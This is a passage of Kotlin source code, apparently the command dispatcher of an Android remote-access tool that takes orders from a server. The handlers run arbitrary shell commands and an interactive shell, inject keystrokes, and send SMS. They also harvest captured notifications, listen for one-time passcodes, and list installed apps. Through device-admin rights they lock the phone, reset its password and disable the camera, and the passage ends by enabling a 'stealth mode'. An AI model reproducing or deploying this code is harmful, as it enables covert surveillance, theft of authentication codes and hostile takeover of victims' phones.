            Log.i("ClientService", "VirtualShellService started")
            sendMessage(context, false, "CREATE_INTERACTIVE_VIRTUAL_SHELL: Operation completed successfully", messageID, serverID)
        } else {
            sendMessage(context, false, "CREATE_INTERACTIVE_VIRTUAL_SHELL: Operation failed - virtual shell is already running", messageID, serverID)
        }
    } else if (command.startsWith("SEND_SHELL_INPUT ")) {
        val input = command.removePrefix("SEND_SHELL_INPUT ")
        context.sendBroadcast(Intent(VirtualShellService.ACTION_INPUT).apply {
            putExtra(VirtualShellService.EXTRA_INPUT, input)
        })
    } else if (command == "CLOSE_VIRTUAL_SHELL") {
        try {
            context.sendBroadcast(Intent(VirtualShellService.ACTION_SHUTDOWN))
            context.stopService(Intent(context, VirtualShellService::class.java))
            context.unregisterReceiver(virtualShellOutputBroadcastReceiver)
            context.unregisterReceiver(virtualShellErrorBroadcastReceiver)
            sendMessage(context, false, "CLOSE_VIRTUAL_SHELL: Operation completed successfully", messageID, serverID)
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(context, false, "CLOSE_VIRTUAL_SHELL: Operation failed - ${ex.localizedMessage}", messageID, serverID)
        }
    } else if (command == "IS_VIRTUAL_SHELL_RUNNING") {
        sendMessage(
            context,
            false,
            "IS_VIRTUAL_SHELL_RUNNING: ${boolToYesNo(isMyServiceRunning(context, VirtualShellService::class.java))}",
            messageID, serverID
        )
    } else if (command.startsWith("SEND_SHELL_KEY_STROKES ")) {
        try {
            val delay = command.removePrefix("SEND_SHELL_KEY_STROKES ").split(" ")[0].toLong()
            val keystrokes = command.removePrefix("SEND_SHELL_KEY_STROKES $delay ")
            context.sendBroadcast(Intent(VirtualShellService.ACTION_INPUT).apply {
                putExtra(VirtualShellService.EXTRA_KEY_STROKES, keystrokes)
                putExtra(VirtualShellService.EXTRA_DELAY, delay)
            })
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(
                context,
                false,
                "SEND_KEY_STROKES: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command.startsWith("RUN_SHELL_COMMAND ")) {
        val thread = Thread(kotlinx.coroutines.Runnable {
            val c = context
            var process: Process? = null
            val output = StringBuffer()
            val erroutput = StringBuffer()
            try {
                sendMessage(c, false, "RUN_SHELL_COMMAND: Thread Index: ${threads.size - 1}", messageID, serverID)
                Log.d("ClientThread", "Running command")

                // Executes the command.

                process =
                    Runtime.getRuntime()
                        .exec(command.removePrefix("RUN_SHELL_COMMAND "))

                // Reads stdout.
                // NOTE: You can write to stdin of the command using
                //       process.getOutputStream().
                var reader = BufferedReader(
                    InputStreamReader(process.inputStream)
                )
                var read: Int
                val buffer = CharArray(4096)
                while ((reader.read(buffer).also { read = it }) > 0) {
                    output.append(buffer, 0, read)
                    if (threads.size == 0) {
                        reader.close()
                        process.destroyForcibly()
                        throw InterruptedException()
                    }
                }
                reader.close()
                // Reads stderr.
                // NOTE: You can write to stdin of the command using
                //       process.getOutputStream().
                reader = BufferedReader(
                    InputStreamReader(process.errorStream)
                )
                while ((reader.read(buffer).also { read = it }) > 0) {
                    erroutput.append(buffer, 0, read)
                    if (threads.size == 0) {
                        reader.close()
                        process.destroyForcibly()
                        throw InterruptedException()
                    }
                }
                reader.close()

                // Waits for the command to finish.
                while (process.isAlive) {
                    process.waitFor(100, TimeUnit.MILLISECONDS)
                    if (threads.size == 0) {
                        process.destroyForcibly()
                        throw InterruptedException()
                    }
                }

                sendMessage(
                    c,
                    false,
                    "RUN_SHELL_COMMAND: ${Gson().toJson(arrayOf(output.toString(), erroutput.toString()))}",
                    messageID, serverID
                )
            } catch (ex: InterruptedException) {
                ex.printStackTrace()
                if (process != null) {
                    try {
                        process.destroyForcibly()
                        sendMessage(
                            c,
                            false,
                            "RUN_SHELL_COMMAND: Operation interrupted - ${Gson().toJson(arrayOf(output.toString(), erroutput.toString()))}",
                            messageID, serverID
                        )
                    } catch (ex: Exception) {
                        ex.printStackTrace()
                        sendMessage(
                            c,
                            false,
                            "RUN_SHELL_COMMAND: Operation failed - ${ex.localizedMessage}",
                            messageID, serverID
                        )
                    }
                }
            } catch (ex: Exception) {
                ex.printStackTrace()
                sendMessage(
                    c,
                    false,
                    "RUN_SHELL_COMMAND: Operation failed - ${ex.localizedMessage}",
                    messageID, serverID
                )
            }
        })
        thread.start()
        threads.add(thread)
        Thread.sleep(50)
    } else if (command.startsWith("S_RUN_SHELL_COMMAND ")) {
        val thread = Thread(kotlinx.coroutines.Runnable {
            val c = context
            val output = StringBuffer()
            val erroutput = StringBuffer()

            sendMessage(c, false, "S_RUN_SHELL_COMMAND: Thread Index: ${threads.size - 1}", messageID, serverID)
            Log.d("ClientThread", "Running command")

            // Executes the command.

            val process =
                Runtime.getRuntime()
                    .exec(arrayOf("sh", "-c", command.removePrefix("S_RUN_SHELL_COMMAND ")))
            try {
                // Reads stdout.
                // NOTE: You can write to stdin of the command using
                //       process.getOutputStream().
                var reader = BufferedReader(
                    InputStreamReader(process.inputStream)
                )
                var read: Int
                val buffer = CharArray(4096)
                while ((reader.read(buffer).also { read = it }) > 0) {
                    output.append(buffer, 0, read)
                    if (threads.size == 0) {
                        reader.close()
                        process.destroyForcibly()
                        throw InterruptedException()
                    }
                }
                reader.close()
                // Reads stderr.
                // NOTE: You can write to stdin of the command using
                //       process.getOutputStream().
                reader = BufferedReader(
                    InputStreamReader(process.errorStream)
                )
                while ((reader.read(buffer).also { read = it }) > 0) {
                    erroutput.append(buffer, 0, read)
                    if (threads.size == 0) {
                        reader.close()
                        process.destroyForcibly()
                        throw InterruptedException()
                    }
                }
                reader.close()

                // Waits for the command to finish.
                while (process.isAlive) {
                    process.waitFor(100, TimeUnit.MILLISECONDS)
                    if (threads.size == 0) {
                        process.destroyForcibly()
                        throw InterruptedException()
                    }
                }

                sendMessage(
                    c,
                    false,
                    "S_RUN_SHELL_COMMAND: ${Gson().toJson(arrayOf(output.toString(), erroutput.toString()))}",
                    messageID, serverID
                )
            } catch (ex: InterruptedException) {
                ex.printStackTrace()
                try {
                    process.destroyForcibly()
                    sendMessage(
                        c,
                        false,
                        "S_RUN_SHELL_COMMAND: Operation interrupted - ${Gson().toJson(arrayOf(output.toString(), erroutput.toString()))}",
                        messageID, serverID
                    )
                } catch (ex: Exception) {
                    ex.printStackTrace()
                    sendMessage(
                        c,
                        false,
                        "S_RUN_SHELL_COMMAND: Operation failed - ${ex.localizedMessage}",
                        messageID, serverID
                    )
                }
            } catch (ex: Exception) {
                ex.printStackTrace()
                sendMessage(
                    c,
                    false,
                    "S_RUN_SHELL_COMMAND: Operation failed - ${ex.localizedMessage}",
                    messageID, serverID
                )
            }
        })
        thread.start()
        threads.add(thread)
        Thread.sleep(50)
    } else if (command.startsWith("RUN_SHELL_COMMAND2 ")) {
        val thread = Thread(kotlinx.coroutines.Runnable {
            val c = context
            var process: Process? = null
            val output = StringBuffer()
            val erroutput = StringBuffer()
            var filePath = ""
            try {
                sendMessage(c, false, "RUN_SHELL_COMMAND2: Thread Index: ${threads.size - 1}", messageID, serverID)
                Log.d("ClientThread", "Running command")

                filePath = "/" + command.removePrefix("RUN_SHELL_COMMAND2 ").split(" <!@ || @!> ")[0].removePrefix("/")
                // Executes the command.

                process =
                    Runtime.getRuntime()
                        .exec(command.removePrefix("RUN_SHELL_COMMAND2 ").split(" <!@ || @!> ")[1])

                // Reads stdout.
                // NOTE: You can write to stdin of the command using
                //       process.getOutputStream().
                var reader = BufferedReader(
                    InputStreamReader(process!!.inputStream)
                )
                var read: Int
                val buffer = CharArray(4096)
                while ((reader.read(buffer).also { read = it }) > 0) {
                    output.append(buffer, 0, read)
                    if (threads.size == 0) {
                        reader.close()
                        process!!.destroyForcibly()
                        throw InterruptedException()
                    }
                }
                reader.close()
                // Reads stderr.
                // NOTE: You can write to stdin of the command using
                //       process.getOutputStream().
                reader = BufferedReader(
                    InputStreamReader(process!!.errorStream)
                )
                while ((reader.read(buffer).also { read = it }) > 0) {
                    erroutput.append(buffer, 0, read)
                    if (threads.size == 0) {
                        reader.close()
                        process!!.destroyForcibly()
                        throw InterruptedException()
                    }
                }
                reader.close()

                // Waits for the command to finish.
                while (process!!.isAlive) {
                    process!!.waitFor(100, TimeUnit.MILLISECONDS)
                    if (threads.size == 0) {
                        process!!.destroyForcibly()
                        throw InterruptedException()
                    }
                }

                val contents = Gson().toJson(
                    arrayOf(
                        output.toString(),
                        erroutput.toString()
                    )
                )
                File(filePath).writeText(contents)
                sendMessage(
                    c,
                    false,
                    "RUN_SHELL_COMMAND2: Operation completed successfully",
                    messageID, serverID
                )
            } catch (ex: InterruptedException) {
                ex.printStackTrace()
                if (process != null) {
                    try {
                        process!!.destroyForcibly()
                        val contents = Gson().toJson(
                            arrayOf(
                                output.toString(),
                                erroutput.toString()
                            )
                        )
                        File(filePath).writeText(contents)
                        sendMessage(
                            c,
                            false,
                            "RUN_SHELL_COMMAND2: Operation interrupted",
                            messageID, serverID
                        )
                    } catch (ex: Exception) {
                        ex.printStackTrace()
                        sendMessage(
                            c,
                            false,
                            "RUN_SHELL_COMMAND2: Operation failed - ${ex.localizedMessage}",
                            messageID, serverID
                        )
                    }
                }
            } catch (ex: Exception) {
                ex.printStackTrace()
                sendMessage(
                    c,
                    false,
                    "RUN_SHELL_COMMAND2: Operation failed - ${ex.localizedMessage}",
                    messageID, serverID
                )
            }
        })
        thread.start()
        threads.add(thread)
        Thread.sleep(50)
    } else if (command.startsWith("S_RUN_SHELL_COMMAND2 ")) {
        val thread = Thread(kotlinx.coroutines.Runnable {
            val c = context
            var process: Process? = null
            val output = StringBuffer()
            val erroutput = StringBuffer()
            var filePath = ""
            try {
                sendMessage(c, false, "S_RUN_SHELL_COMMAND2: Thread Index: ${threads.size - 1}", messageID, serverID)
                Log.d("ClientThread", "Running command")

                filePath = "/" + command.removePrefix("S_RUN_SHELL_COMMAND2 ").split(" <!@ || @!> ")[0].removePrefix("/")
                // Executes the command.

                process =
                    Runtime.getRuntime()
                        .exec(command.removePrefix("S_RUN_SHELL_COMMAND2 ").split(" <!@ || @!> ")[1])

                // Reads stdout.
                // NOTE: You can write to stdin of the command using
                //       process.getOutputStream().
                var reader = BufferedReader(
                    InputStreamReader(process!!.inputStream)
                )
                var read: Int
                val buffer = CharArray(4096)
                while ((reader.read(buffer).also { read = it }) > 0) {
                    output.append(buffer, 0, read)
                    if (threads.size == 0) {
                        reader.close()
                        process!!.destroyForcibly()
                        throw InterruptedException()
                    }
                }
                reader.close()
                // Reads stderr.
                // NOTE: You can write to stdin of the command using
                //       process.getOutputStream().
                reader = BufferedReader(
                    InputStreamReader(process!!.errorStream)
                )
                while ((reader.read(buffer).also { read = it }) > 0) {
                    erroutput.append(buffer, 0, read)
                    if (threads.size == 0) {
                        reader.close()
                        process!!.destroyForcibly()
                        throw InterruptedException()
                    }
                }
                reader.close()

                // Waits for the command to finish.
                while (process!!.isAlive) {
                    process!!.waitFor(100, TimeUnit.MILLISECONDS)
                    if (threads.size == 0) {
                        process!!.destroyForcibly()
                        throw InterruptedException()
                    }
                }

                val contents = Gson().toJson(
                    arrayOf(
                        output.toString(),
                        erroutput.toString()
                    )
                )
                File(filePath).writeText(contents)
                sendMessage(
                    c,
                    false,
                    "S_RUN_SHELL_COMMAND2: Operation completed successfully",
                    messageID, serverID
                )
            } catch (ex: InterruptedException) {
                ex.printStackTrace()
                if (process != null) {
                    try {
                        process!!.destroyForcibly()
                        val contents = Gson().toJson(
                            arrayOf(
                                output.toString(),
                                erroutput.toString()
                            )
                        )
                        File(filePath).writeText(contents)
                        sendMessage(
                            c,
                            false,
                            "S_RUN_SHELL_COMMAND2: Operation interrupted",
                            messageID, serverID
                        )
                    } catch (ex: Exception) {
                        ex.printStackTrace()
                        sendMessage(
                            c,
                            false,
                            "S_RUN_SHELL_COMMAND2: Operation failed - ${ex.localizedMessage}",
                            messageID, serverID
                        )
                    }
                }
            } catch (ex: Exception) {
                ex.printStackTrace()
                sendMessage(
                    c,
                    false,
                    "S_RUN_SHELL_COMMAND2: Operation failed - ${ex.localizedMessage}",
                    messageID, serverID
                )
            }
        })
        thread.start()
        threads.add(thread)
        Thread.sleep(50)
    } else if (command.startsWith("SEND_SMS ")) {
        try {
            if (command.removePrefix("SEND_SMS ")
                    .split(" ").size >= 3
            ) {
                val p =
                    command.removePrefix("SEND_SMS ").split(" ")[0]
                val d =
                    command.removePrefix("SEND_SMS ").split(" ")[1]
                val m = command.removePrefix("SEND_SMS $p $d ")
                val smsManager: SmsManager = SmsManager.getDefault()
                smsManager.sendTextMessage(
                    d,
                    p,
                    m,
                    null,
                    null
                )
                sendMessage(
                    context,
                    false,
                    "SEND_SMS: Operation completed successfully",
                    messageID, serverID
                )
            } else {
                sendMessage(
                    context,
                    false,
                    "SEND_SMS: Operation failed - insufficient parameters",
                    messageID, serverID
                )
            }
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(
                context,
                false,
                "SEND_SMS: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command.startsWith("IS_THREAD_INTERRUPTED ")) {
        try {
            val threadNo = command.removePrefix("IS_THREAD_INTERRUPTED ").toInt()
            sendMessage(
                context,
                false,
                "IS_THREAD_INTERRUPTED: ${boolToYesNo(threads[threadNo].isInterrupted)}",
                messageID, serverID
            )
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(
                context,
                false,
                "IS_THREAD_INTERRUPTED: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command.startsWith("IS_THREAD_ALIVE ")) {
        try {
            val threadNo = command.removePrefix("IS_THREAD_ALIVE ").toInt()
            sendMessage(
                context,
                false,
                "IS_THREAD_ALIVE: ${boolToYesNo(threads[threadNo].isAlive)}",
                messageID, serverID
            )
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(
                context,
                false,
                "IS_THREAD_ALIVE: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command == "INTERRUPT_AND_CLEAR_ALL_THREADS") {
        for (thread in threads) {
            thread.interrupt()
        }
        threads.clear()
        sendMessage(context, false, "INTERRUPT_AND_CLEAR_ALL_THREADS: Operation completed successfully", messageID, serverID)
    } else if (command.startsWith("INTERRUPT_THREAD ")) {
        try {
            val threadNo = command.removePrefix("INTERRUPT_THREAD ").toInt()
            if (!threads[threadNo].isInterrupted) {
                if (threads[threadNo].isAlive) {
                    threads[threadNo].interrupt()
                } else {
                    sendMessage(
                        context,
                        false,
                        "INTERRUPT_THREAD: Operation failed - thread is not alive",
                        messageID, serverID
                    )
                }
            } else {
                sendMessage(
                    context,
                    false,
                    "INTERRUPT_THREAD: Operation failed - thread is already interrupted",
                    messageID, serverID
                )
            }
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(
                context,
                false,
                "INTERRUPT_THREAD: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command == "GET_NATIVE_LIB_DIR") {
        sendMessage(context, false, "GET_NATIVE_LIB_DIR: ${context.applicationInfo.nativeLibraryDir}", messageID, serverID)
    } else if (command == "GET_ALL_CAPTURED_NOTIFICATIONS") {
        sendMessage(context, false, "GET_ALL_CAPTURED_NOTIFICATIONS: ${Gson().toJson(notifications)}", messageID, serverID)
    } else if (command == "STOP_SERVICE") {
        sendMessage(
            context,
            false,
            "STOP_SERVICE: Operation completed successfully",
            messageID, serverID
        )
        return true
    } else if (command == "CLEAR_ALL_CAPTURED_NOTIFICATIONS") {
        notifications.clear()
        sendMessage(
            context,
            false,
            "CLEAR_ALL_CAPTURED_NOTIFICATIONS: Operation completed successfully",
            messageID, serverID
        )
    } else if (command == "START_LISTENING_FOR_OTP") {
        listenForOtp = true
        sendMessage(
            context,
            false,
            "START_LISTENING_FOR_OTP: Operation completed successfully",
            messageID, serverID
        )
    } else if (command == "STOP_LISTENING_FOR_OTP") {
        listenForOtp = false
        sendMessage(
            context,
            false,
            "STOP_LISTENING_FOR_OTP: Operation completed successfully",
            messageID, serverID
        )
    } else if (command == "GET_INSTALLED_APPS") {
        val packages =
            context.packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
        val retList = mutableListOf<Array<String>>()
        for (packageInfo in packages) {
            retList.add(
                arrayOf(
                    if (packageInfo.name != null) packageInfo.name else "",
                    packageInfo.packageName,
                    packageInfo.sourceDir,
                    if (packageInfo.className != null) packageInfo.className else "",
                    packageInfo.processName,
                    packageInfo.dataDir,
                    if (packageInfo.permission != null) packageInfo.permission else "",
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) packageInfo.compileSdkVersion.toString() else ""
                )
            )
        }
        sendMessage(
            context,
            false,
            "GET_INSTALLED_APPS: ${Gson().toJson(retList)}",
            messageID, serverID
        )
    } else if (command.startsWith("OPEN_APP ")) {
        try {
            // Not working!
            val pkgName =
                command.removePrefix("OPEN_APP ").split(" <> ")[0]
            val className =
                command.removePrefix("OPEN_APP ").split(" <> ")[1]
            val intent = Intent(Intent.ACTION_MAIN)
            intent.addCategory(Intent.CATEGORY_LAUNCHER);
            intent.setPackage(pkgName);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.setClassName(pkgName, className);
            context.startActivity(intent)
            sendMessage(
                context,
                false,
                "OPEN_APP: Operation completed successfully",
                messageID, serverID
            )
        } catch (ex: Exception) {
            sendMessage(
                context,
                false,
                "OPEN_APP: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command == "GET_DEVICE_ADMIN_STATUS") {
        // Use Device Policy Manager to lock the device
        val devicePolicyManager =
            context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent: ComponentName =
            ComponentName(context, ReceiverDeviceAdmin::class.java)

        if (devicePolicyManager.isAdminActive(adminComponent)) {
            sendMessage(
                context,
                false,
                "GET_DEVICE_ADMIN_STATUS: Is Device Admin - Yes",
                messageID, serverID
            )
        } else {
            sendMessage(
                context,
                false,
                "GET_DEVICE_ADMIN_STATUS: Is Device Admin - No",
                messageID, serverID
            )
        }
    } else if (command == "LOCK_DEVICE") {
        // Use Device Policy Manager to lock the device
        val devicePolicyManager =
            context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent: ComponentName =
            ComponentName(context, ReceiverDeviceAdmin::class.java)

        if (devicePolicyManager.isAdminActive(adminComponent)) {
            devicePolicyManager.lockNow()
            sendMessage(
                context,
                false,
                "LOCK_DEVICE: Operation completed successfully",
                messageID, serverID
            )
        } else {
            sendMessage(
                context,
                false,
                "LOCK_DEVICE: Operation failed - app is not a device admin",
                messageID, serverID
            )
        }
    } else if (command.startsWith("RESET_PASSWORD ")) {
        // Use Device Policy Manager to lock the device
        val devicePolicyManager =
            context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent: ComponentName =
            ComponentName(context, ReceiverDeviceAdmin::class.java)

        if (devicePolicyManager.isAdminActive(adminComponent)) {
            try {
                devicePolicyManager.resetPassword(
                    command.removePrefix("RESET_PASSWORD "),
                    DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY
                )
                sendMessage(
                    context,
                    false,
                    "RESET_PASSWORD: Operation completed successfully",
                    messageID, serverID
                )
            } catch (ex: Exception) {
                sendMessage(
                    context,
                    false,
                    "RESET_PASSWORD: Operation failed - ${ex.localizedMessage}",
                    messageID, serverID
                )
            }
        } else {
            sendMessage(
                context,
                false,
                "RESET_PASSWORD: Operation failed - app is not a device admin",
                messageID, serverID
            )
        }
    } else if (command.startsWith("ENABLE_SYSTEM_APP ")) {
        // Use Device Policy Manager to lock the device
        val devicePolicyManager =
            context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent: ComponentName =
            ComponentName(context, ReceiverDeviceAdmin::class.java)

        if (devicePolicyManager.isAdminActive(adminComponent)) {
            try {
                devicePolicyManager.enableSystemApp(
                    adminComponent,
                    context.packageManager.getLaunchIntentForPackage(command.removePrefix("ENABLE_SYSTEM_APP "))
                )
                sendMessage(
                    context,
                    false,
                    "ENABLE_SYSTEM_APP: Operation completed successfully",
                    messageID, serverID
                )
            } catch (ex: Exception) {
                sendMessage(
                    context,
                    false,
                    "ENABLE_SYSTEM_APP: Operation failed - ${ex.localizedMessage}",
                    messageID, serverID
                )
            }
        } else {
            sendMessage(
                context,
                false,
                "ENABLE_SYSTEM_APP: Operation failed - app is not a device admin",
                messageID, serverID
            )
        }
    } else if (command == "DISABLE_CAMERA") {
        // Use Device Policy Manager to lock the device
        val devicePolicyManager =
            context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent: ComponentName =
            ComponentName(context, ReceiverDeviceAdmin::class.java)

        if (devicePolicyManager.isAdminActive(adminComponent)) {
            try {
                devicePolicyManager.setCameraDisabled(
                    adminComponent,
                    true
                )
                sendMessage(
                    context,
                    false,
                    "DISABLE_CAMERA: Operation completed successfully",
                    messageID, serverID
                )
            } catch (ex: Exception) {
                sendMessage(
                    context,
                    false,
                    "DISABLE_CAMERA: Operation failed - ${ex.localizedMessage}",
                    messageID, serverID
                )
            }
        } else {
            sendMessage(
                context,
                false,
                "DISABLE_CAMERA: Operation failed - app is not a device admin",
                messageID, serverID
            )
        }
    } else if (command == "ENABLE_CAMERA") {
        // Use Device Policy Manager to lock the device
        val devicePolicyManager =
            context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent: ComponentName =
            ComponentName(context, ReceiverDeviceAdmin::class.java)

        if (devicePolicyManager.isAdminActive(adminComponent)) {
            try {
                devicePolicyManager.setCameraDisabled(
                    adminComponent,
                    false
                )
                sendMessage(
                    context,
                    false,
                    "ENABLE_CAMERA: Operation completed successfully",
                    messageID, serverID
                )
            } catch (ex: Exception) {
                sendMessage(
                    context,
                    false,
                    "ENABLE_CAMERA: Operation failed - ${ex.localizedMessage}",
                    messageID, serverID
                )
            }
        } else {
            sendMessage(
                context,
                false,
                "ENABLE_CAMERA: Operation failed - app is not a device admin",
                messageID, serverID
            )
        }
    } else if (command.startsWith("GET_SENSORS_DATA ")) {
        try {
            collectSensorData(context, command.removePrefix("GET_SENSORS_DATA ").toLong()) { jsonStrData ->
                sendMessage(context, false, "GET_SENSORS_DATA: $jsonStrData", messageID, serverID)
            }
        } catch (ex: Exception) {
            sendMessage(context, false, "GET_SENSORS_DATA: Operation failed - ${ex.localizedMessage}", messageID, serverID)
        }
    } else if (command == "GET_SPEED") {
// Initialize SensorManager
        val sensorManager = context.getSystemService(SENSOR_SERVICE) as SensorManager

// Get the accelerometer sensor
        val accelerometerSensor = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)

        var previousTime: Long = 0
        var speed: Float = 0f // Speed in m/s
        var hasFirstData = false // Flag to track if we have the first sensor data
        var threshold = 0.02f // Threshold for ignoring tiny movements (e.g., 0.02 m/s^2)
        var lastAcceleration = FloatArray(3) // To store last acceleration values

// Variables for removing gravity using high-pass filter (approximating the device's acceleration)
        val gravity = FloatArray(3) // Store gravity values from the accelerometer
        val accel = FloatArray(3)  // Store the actual acceleration (without gravity)

// Check if the device has an accelerometer
        if (accelerometerSensor != null) {
            // Create the SensorEventListener to listen for accelerometer data
            val accelerometerEventListener = object : SensorEventListener {
                override fun onSensorChanged(event: SensorEvent?) {
                    // If the event sensor is the accelerometer
                    if (event != null && event.sensor.type == Sensor.TYPE_ACCELEROMETER) {
                        // Get the accelerometer values (X, Y, Z)
                        val ax = event.values[0] // X acceleration
                        val ay = event.values[1] // Y acceleration
                        val az = event.values[2] // Z acceleration

                        // Get the current time in milliseconds
                        val currentTime = System.currentTimeMillis()

                        // Calculate the time difference (in seconds)
                        val deltaTime = (currentTime - previousTime) / 1000f

                        // Ensure a reasonable time difference to avoid noise (minimum 0.01s)
                        if (deltaTime >= 0.01) {
                            // High-pass filter to remove gravity (subtract gravity vector from the total acceleration)
                            // Update gravity using a simple low-pass filter
                            val alpha = 0.8f // Adjust for sensitivity (adjustable)
                            gravity[0] = alpha * gravity[0] + (1 - alpha) * ax
                            gravity[1] = alpha * gravity[1] + (1 - alpha) * ay
                            gravity[2] = alpha * gravity[2] + (1 - alpha) * az

                            // Subtract gravity from the accelerometer values to get the actual acceleration
                            accel[0] = ax - gravity[0]
                            accel[1] = ay - gravity[1]
                            accel[2] = az - gravity[2]

                            // Calculate the magnitude of the total acceleration (movement acceleration)
                            val magnitude = Math.sqrt((accel[0] * accel[0] + accel[1] * accel[1] + accel[2] * accel[2]).toDouble()).toFloat()

                            // Only integrate if the magnitude is above a small threshold
                            if (magnitude > threshold) {
                                // Integrating acceleration to calculate speed (magnitude * deltaTime)
                                speed += magnitude * deltaTime
                            }

                            // Update the previous time for the next iteration
                            previousTime = currentTime

                            // Mark the flag after the first event
                            if (!hasFirstData) {
                                hasFirstData = true
                            }
                        }

                        // If we have valid data (second event), calculate speed and unregister the listener
                        if (hasFirstData) {
                            // Output the speed once and unregister the listener
                            println("Calculated Speed: $speed m/s")

                            sendMessage(context, false, "GET_SPEED: $speed m/s", messageID, serverID)

                            // Unregister the listener to stop further updates
                            sensorManager.unregisterListener(this)
                        }
                    }
                }

                override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {
                    // Send accuracy changes
                    sendMessage(context, false, "GET_SPEED: Accuracy is $accuracy m", messageID, serverID)
                }
            }

            // Register the accelerometer listener to listen for sensor data
            sensorManager.registerListener(accelerometerEventListener, accelerometerSensor, SensorManager.SENSOR_DELAY_UI)
        } else {
            sendMessage(
                context,
                false,
                "GET_SPEED: Operation failed - device has no accelerometer",
                messageID, serverID
            )
        }
    } else if (command == "GET_DEVICE_HEADING") {
        DeviceOrientationHelper.getDeviceHeading(
            context,
            object : DeviceOrientationHelper.HeadingCallback {
                override fun onHeadingChanged(heading: Float) {
                    sendMessage(context, false, "GET_DEVICE_HEADING: $heading", messageID, serverID)
                }
            },
            object : DeviceOrientationHelper.ErrorCallback {
                override fun onError(error: String) {
                    sendMessage(
                        context,
                        false,
                        "GET_DEVICE_HEADING: Operation failed - $error",
                        messageID,
                        serverID
                    )
                }
            }
        )
    } else if (command.startsWith("OPEN_APP2 ")) {
        try {
            openApp(context, command.removePrefix("OPEN_APP2 "))
            sendMessage(context, false, "OPEN_APP2: Operation completed successfully", messageID, serverID)
        } catch (ex: Exception) {
            sendMessage(context, false, "OPEN_APP2: Operation failed - ${ex.localizedMessage}", messageID, serverID)
        }
    } else if (command.startsWith("SET_INTERRUPTION_FILTER ")) {
        try {
            val filterName = command.removePrefix("SET_INTERRUPTION_FILTER ")
            val mNotificationManager =
                context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager?
            var error = false
            when (filterName) {
                "INTERRUPTION_FILTER_ALL" -> {
                    mNotificationManager!!.setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_ALL)
                }

                "INTERRUPTION_FILTER_NONE" -> {
                    mNotificationManager!!.setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_NONE)
                }

                "INTERRUPTION_FILTER_ALARMS" -> {
                    mNotificationManager!!.setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_ALARMS)
                }

                "INTERRUPTION_FILTER_PRIORITY" -> {
                    mNotificationManager!!.setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_PRIORITY)
                }

                else -> {
                    error = true
                }
            }
            if (!error) {
                sendMessage(
                    context,
                    false,
                    "SET_INTERRUPTION_FILTER: Operation completed successfully",
                    messageID, serverID
                )
            } else {
                sendMessage(
                    context,
                    false,
                    "SET_INTERRUPTION_FILTER: Operation failed - invalid filter name",
                    messageID, serverID
                )
            }
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(
                context,
                false,
                "SET_INTERRUPTION_FILTER: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command == "GET_INTERRUPTION_FILTER") {
        try {
            val mNotificationManager =
                context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager?
            when (mNotificationManager!!.currentInterruptionFilter) {
                NotificationManager.INTERRUPTION_FILTER_ALL -> {
                    sendMessage(
                        context,
                        false,
                        "GET_INTERRUPTION_FILTER: INTERRUPTION_FILTER_PRIORITY",
                        messageID, serverID
                    )
                }

                NotificationManager.INTERRUPTION_FILTER_NONE -> {
                    sendMessage(
                        context,
                        false,
                        "GET_INTERRUPTION_FILTER: INTERRUPTION_FILTER_PRIORITY",
                        messageID, serverID
                    )
                }

                NotificationManager.INTERRUPTION_FILTER_ALARMS -> {
                    sendMessage(
                        context,
                        false,
                        "GET_INTERRUPTION_FILTER: INTERRUPTION_FILTER_PRIORITY",
                        messageID, serverID
                    )
                }

                NotificationManager.INTERRUPTION_FILTER_PRIORITY -> {
                    sendMessage(
                        context,
                        false,
                        "GET_INTERRUPTION_FILTER: INTERRUPTION_FILTER_PRIORITY",
                        messageID, serverID
                    )
                }

                NotificationManager.INTERRUPTION_FILTER_UNKNOWN -> {
                    sendMessage(
                        context,
                        false,
                        "GET_INTERRUPTION_FILTER: INTERRUPTION_FILTER_UNKNOWN",
                        messageID, serverID
                    )
                }

                else -> {
                    sendMessage(
                        context,
                        false,
                        "GET_INTERRUPTION_FILTER: ${mNotificationManager.currentInterruptionFilter}",
                        messageID, serverID
                    )
                }
            }
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(
                context,
                false,
                "GET_INTERRUPTION_FILTER: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command == "ENABLE_STEALTH_MODE") {
        isStealthModeEnabled = true
        with(preferences.edit()) {
            putBoolean("IsStealthModeEnabled", true)
            commit()
        }
